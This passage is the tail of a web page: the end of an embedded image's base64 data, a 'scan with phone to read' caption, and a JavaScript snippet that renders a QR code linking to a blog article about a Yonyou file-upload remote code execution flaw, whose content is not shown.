Q+hh/iM76LExT2OIuHwb7DmvQQgRkz+a8zNC6KGvLcftu5bHQohc+bZK99GGeKKF5ztwFv1oQ6qOm4O4QqC+uqzLCJFTPYGsG/2sd8wcRE3AVIlAe3sK4VdC189Y6c44iPrA+i7r62Y/Hz0hN3tu/8rlTA3JR6/y332WEMfxWR7MOs8PEfNYCMHlujBzOT76qiODyANGyTaWRrYNfv8Cppc02HPKsf1O2wGE3hrh1JBdxhr8+A60hkB0C17Ds5VCr6Guj1blWgM9F8K3HmIM/Y0BdK7SjZznETr2J6g6sqoGzGurdJlrDcnk8q/bgdWQ6/a+nPl/AAAA//8rLpKRAAAABklEQVQDAOO3iKp34DWYAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-xwzfile-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 